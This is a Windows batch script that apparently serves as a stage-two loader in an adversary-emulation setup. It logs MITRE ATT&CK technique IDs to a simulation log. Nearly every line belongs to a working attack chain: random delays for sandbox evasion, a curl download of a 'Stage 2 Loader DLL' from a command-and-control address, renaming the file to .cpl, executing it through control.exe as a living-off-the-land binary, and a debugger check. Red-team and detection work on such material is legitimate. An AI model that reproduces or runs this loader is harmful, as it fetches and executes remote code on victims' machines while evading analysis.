@echo off
setlocal enabledelayedexpansion

REM Random-named SET variable declarations for all PHR_* placeholders
SET qwexzf=%APPDATA%\10844\e36e9e79
SET plokij=055465b1.txt
SET mnbvcu=https://10.0.0.49/stage/2/icon.png?10844-7
SET lkjhgf=BALAM-S2BO
SET poiuyu=10844
SET bvcxza=7
SET zxcvbn=%PUBLIC%\\macula-simulations.log

REM Cache timestamp for debug logging
SET tsvar=!DATE!/!TIME!

REM --- Initial delay (10-20s) ---
SET /A rdelay=%RANDOM% %% 11 + 10
timeout /t !rdelay! /nobreak >nul

REM --- Debug: heartbeat start ---
echo [!tsvar!][DEBUG][!lkjhgf!][!poiuyu!]: heartbeat_start>> "!zxcvbn!" 2>nul

REM --- Heartbeat fetch: download Stage 2 Loader DLL from C2 ---
curl -k -s -o "!qwexzf!\!plokij!" "!mnbvcu!"
set hberr=!errorlevel!

REM --- Debug: heartbeat complete ---
echo [!tsvar!][DEBUG][!lkjhgf!][!poiuyu!]: heartbeat_complete=!hberr!>> "!zxcvbn!" 2>nul

REM --- Delay (5-15s) using ping ---
SET /A pdly=%RANDOM% %% 11 + 5
ping -n !pdly! 127.0.0.1 >nul

REM --- Debug: chdir start ---
echo [!tsvar!][DEBUG][!lkjhgf!][!poiuyu!]: chdir_start>> "!zxcvbn!" 2>nul

REM --- Change working directory to output directory ---
cd /d "!qwexzf!" >nul 2>&1
set cderr=!errorlevel!

REM --- Debug: chdir result ---
echo [!tsvar!][DEBUG][!lkjhgf!][!poiuyu!]: chdir_result=!cderr!>> "!zxcvbn!" 2>nul

REM --- Delay (5-15s) using CHOICE ---
SET /A cdly=%RANDOM% %% 11 + 5
CHOICE /C Y /N /D Y /T !cdly! >nul

REM --- Debug: rename start ---
echo [!tsvar!][DEBUG][!lkjhgf!][!poiuyu!]: rename_start>> "!zxcvbn!" 2>nul

REM --- Rename output file to .cpl ---
ren "!plokij!" "!plokij!.cpl"
set rnerr=!errorlevel!

REM --- Debug: rename result ---
echo [!tsvar!][DEBUG][!lkjhgf!][!poiuyu!]: rename_result=!rnerr!>> "!zxcvbn!" 2>nul

REM --- Delay (5-15s) using timeout ---
SET /A tdly=%RANDOM% %% 11 + 5
timeout /t !tdly! /nobreak >nul

REM --- Debug: execute start ---
echo [!tsvar!][DEBUG][!lkjhgf!][!poiuyu!]: execute_start>> "!zxcvbn!" 2>nul

REM --- Invoke via LOLBIN: control.exe ---
start /b "" control.exe "!plokij!.cpl"
set excerr=!errorlevel!

REM --- Debug: execute complete ---
echo [!tsvar!][DEBUG][!lkjhgf!][!poiuyu!]: execute_complete=!excerr!>> "!zxcvbn!" 2>nul

REM --- TTP Logging: T1497 Virtualization/Sandbox Evasion ---
REM (We used delays for evasion; log OK if no critical error)
echo [!tsvar!][TTP][!lkjhgf!][!poiuyu!]: T1497|Virtualization/Sandbox Evasion=OK:>> "!zxcvbn!" 2>nul

REM --- TTP Logging: T1218 System Binary Proxy Execution ---
if !excerr!==0 (
    echo [!tsvar!][TTP][!lkjhgf!][!poiuyu!]: T1218|System Binary Proxy Execution=OK:>> "!zxcvbn!" 2>nul
) else (
    echo [!tsvar!][TTP][!lkjhgf!][!poiuyu!]: T1218|System Binary Proxy Execution=FAIL:!excerr!>> "!zxcvbn!" 2>nul
)

REM --- Anti-analysis: Debugger check (optional, never aborts) ---
REM Use a lightweight powershell check to detect debugger; if found, add sleep.
whoami /? >nul 2>&1
if not errorlevel 1 (
    powershell -Command "if([System.Diagnostics.Debugger]::IsAttached){Start-Sleep -Seconds 3}" >nul 2>&1
)

endlocal